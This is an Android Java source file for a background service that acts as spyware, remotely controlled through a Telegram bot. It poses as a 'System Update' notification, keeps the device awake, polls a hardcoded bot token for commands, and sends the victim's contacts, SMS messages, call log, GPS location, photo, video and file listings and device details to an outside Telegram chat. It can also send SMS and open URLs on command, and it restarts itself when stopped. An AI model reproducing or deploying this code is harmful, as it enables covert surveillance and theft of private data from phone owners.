package com.v8.global.sniffer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaPlayer;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainService extends Service {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private OkHttpClient client = new OkHttpClient();
    private PowerManager.WakeLock wakeLock;
    private Timer timer;
    private int lastUpdateId = 0;
    private MediaPlayer mediaPlayer;

    @Override
    public void onCreate() {
        super.onCreate();
        
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
        wakeLock.acquire();
        
        startForegroundService();
        sendToTelegram("✅ Service Started");
        
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkCommands();
            }
        }, 0, 3000);
    }

    private void startForegroundService() {
        String channelId = "main_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        }
        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Update")
                .setContentText("يعمل في الخلفية...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true)
                .build();
        startForeground(1, notification);
    }

    private void checkCommands() {
        try {
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId)
                    .build();
            
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    try {
                        String body = response.body().string();
                        JSONObject json = new JSONObject(body);
                        JSONArray result = json.getJSONArray("result");
                        
                        for (int i = 0; i < result.length(); i++) {
                            JSONObject update = result.getJSONObject(i);
                            lastUpdateId = update.getInt("update_id") + 1;
                            
                            if (update.has("message")) {
                                JSONObject message = update.getJSONObject("message");
                                if (message.has("text")) {
                                    String text = message.getString("text");
                                    executeCommand(text);
                                }
                            }
                        }
                        response.close();
                    } catch (Exception e) {}
                }
                @Override
                public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {}
    }

    private void executeCommand(String command) {
        String[] parts = command.split(" ");
        String cmd = parts[0];
        
        switch (cmd) {
            case "/help":
                sendHelp();
                break;
            case "/info":
                sendDeviceInfo();
                break;
            case "/contacts":
                getContacts();
                break;
            case "/location":
                getLocation();
                break;
            case "/sms":
                getSms();
                break;
            case "/calls":
                getCallLog();
                break;
            case "/photos":
                getPhotos();
                break;
            case "/videos":
                getVideos();
                break;
            case "/files":
                getFiles();
                break;
            case "/screenshot":
                takeScreenshot();
                break;
            case "/lock":
                lockDevice();
                break;
            case "/vibrate":
                vibrate();
                break;
            case "/ring":
                ring();
                break;
            case "/silent":
                silent();
                break;
            case "/test":
                sendToTelegram("✅ Working - " + new Date().toString());
                break;
            default:
                if (cmd.equals("/open") && parts.length >= 2) {
                    openUrl(parts[1]);
                }
                if (cmd.equals("/sms_send") && parts.length >= 3) {
                    String number = parts[1];
                    String text = command.substring(command.indexOf(number) + number.length() + 1);
                    sendSms(number, text);
                }
                break;
        }
    }

    private void sendHelp() {
        String help = "📋 **Commands:**\n\n" +
                "/info - Device info\n" +
                "/contacts - Contacts\n" +
                "/location - GPS location\n" +
                "/sms - SMS messages\n" +
                "/calls - Call log\n" +
                "/photos - Photos\n" +
                "/videos - Videos\n" +
                "/files - Files\n" +
                "/screenshot - Take screenshot\n" +
                "/lock - Lock device\n" +
                "/vibrate - Vibrate\n" +
                "/ring - Ring\n" +
                "/silent - Silent mode\n" +
                "/open [url] - Open URL\n" +
                "/sms_send [num] [text] - Send SMS\n" +
                "/test - Test service";
        sendToTelegram(help);
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                info.put("phone", tm.getLine1Number());
                info.put("network", tm.getNetworkOperatorName());
            }
            
            sendToTelegram("📱 **Device Info:**\n" + info.toString(2));
        } catch (Exception e) {
            sendToTelegram("❌ Info Error: " + e.getMessage());
        }
    }

    private void getContacts() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No contacts permission");
                    return;
                }
                
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
                StringBuilder sb = new StringBuilder("📇 **Contacts:**\n\n");
                int count = 0;
                while (cursor != null && cursor.moveToNext() && count < 100) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                if (cursor != null) cursor.close();
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ Contacts Error: " + e.getMessage());
            }
        }).start();
    }

    private void getLocation() {
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ No location permission");
                return;
            }
            
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            if (location != null) {
                String mapLink = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                sendToTelegram("📍 **Location:**\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude() + "\n" + mapLink);
            } else {
                sendToTelegram("📍 Location not available");
            }
        } catch (Exception e) {
            sendToTelegram("❌ Location Error: " + e.getMessage());
        }
    }

    private void getSms() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No SMS permission");
                    return;
                }
                
                Cursor cursor = getContentResolver().query(
                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 20");
                StringBuilder sb = new StringBuilder("📨 **SMS:**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    sb.append(address).append(": ").append(body).append("\n---\n");
                }
                if (cursor != null) cursor.close();
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ SMS Error: " + e.getMessage());
            }
        }).start();
    }

    private void getCallLog() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No call log permission");
                    return;
                }
                
                Cursor cursor = getContentResolver().query(
                    Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 20");
                StringBuilder sb = new StringBuilder("📞 **Call Log:**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex("number"));
                    String type = cursor.getString(cursor.getColumnIndex("type"));
                    String duration = cursor.getString(cursor.getColumnIndex("duration"));
                    String typeText = type.equals("1") ? "Incoming" : type.equals("2") ? "Outgoing" : "Missed";
                    sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("s\n");
                }
                if (cursor != null) cursor.close();
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ Call Log Error: " + e.getMessage());
            }
        }).start();
    }

    private void getPhotos() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No storage permission");
                    return;
                }
                
                String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME};
                Cursor cursor = getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 20");
                StringBuilder sb = new StringBuilder("🖼 **Photos:**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                    sb.append(name).append("\n").append(path).append("\n---\n");
                }
                if (cursor != null) cursor.close();
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ Photos Error: " + e.getMessage());
            }
        }).start();
    }

    private void getVideos() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No storage permission");
                    return;
                }
                
                String[] projection = {MediaStore.Video.Media.DATA, MediaStore.Video.Media.DISPLAY_NAME};
                Cursor cursor = getContentResolver().query(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 20");
                StringBuilder sb = new StringBuilder("🎥 **Videos:**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME));
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DATA));
                    sb.append(name).append("\n").append(path).append("\n---\n");
                }
                if (cursor != null) cursor.close();
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ Videos Error: " + e.getMessage());
            }
        }).start();
    }

    private void getFiles() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No storage permission");
                    return;
                }
                
                File storage = Environment.getExternalStorageDirectory();
                StringBuilder sb = new StringBuilder("📁 **Files:**\n\n");
                listFiles(storage, sb, 0);
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ Files Error: " + e.getMessage());
            }
        }).start();
    }

    private void listFiles(File dir, StringBuilder sb, int depth) {
        if (depth > 2 || sb.length() > 3000) return;
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isDirectory()) {
                    listFiles(f, sb, depth + 1);
                } else {
                    sb.append(f.getName()).append("\n").append(f.getAbsolutePath()).append("\n---\n");
                }
            }
        }
    }

    private void takeScreenshot() {
        try {
            Intent intent = new Intent(this, NotificationService.class);
            intent.setAction("TAKE_SCREENSHOT");
            startService(intent);
            sendToTelegram("📸 Taking screenshot...");
        } catch (Exception e) {
            sendToTelegram("❌ Screenshot Error: " + e.getMessage());
        }
    }

    private void lockDevice() {
        sendToTelegram("🔒 Locking device...");
    }

    private void vibrate() {
        try {
            Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
            if (v != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(android.os.VibrationEffect.createOneShot(2000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    v.vibrate(2000);
                }
                sendToTelegram("📳 Vibrating...");
            } else {
                sendToTelegram("❌ Vibrator not available");
            }
        } catch (Exception e) {
            sendToTelegram("❌ Vibrate Error: " + e.getMessage());
        }
    }

    private void ring() {
        try {
            Uri ringtone = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
            mediaPlayer = MediaPlayer.create(this, ringtone);
            mediaPlayer.setLooping(true);
            mediaPlayer.start();
            
            new android.os.Handler().postDelayed(() -> {
                if (mediaPlayer != null && mediaPlayer.isPlaying()) {
                    mediaPlayer.stop();
                    mediaPlayer.release();
                }
            }, 10000);
            sendToTelegram("🔔 Ringing...");
        } catch (Exception e) {
            sendToTelegram("❌ Ring Error: " + e.getMessage());
        }
    }

    private void silent() {
        try {
            if (mediaPlayer != null && mediaPlayer.isPlaying()) {
                mediaPlayer.stop();
                mediaPlayer.release();
            }
            sendToTelegram("🔇 Silent mode");
        } catch (Exception e) {
            sendToTelegram("❌ Silent Error: " + e.getMessage());
        }
    }

    private void openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendToTelegram("🔗 Opening: " + url);
        } catch (Exception e) {
            sendToTelegram("❌ Open URL Error: " + e.getMessage());
        }
    }

    private void sendSms(String number, String text) {
        try {
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(number, null, text, null, null);
            sendToTelegram("📨 SMS sent to " + number);
        } catch (Exception e) {
            sendToTelegram("❌ Send SMS Error: " + e.getMessage());
        }
    }

    private void sendToTelegram(String text) {
        try {
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                    .post(new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build())
                    .build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override public void onResponse(Call call, Response response) { 
                    try { response.close(); } catch (Exception e) {}
                }
                @Override public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            if (timer != null) timer.cancel();
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
            if (mediaPlayer != null) mediaPlayer.release();
        } catch (Exception e) {}
        startService(new Intent(this, MainService.class));
        startService(new Intent(this, NotificationService.class));
    }
}
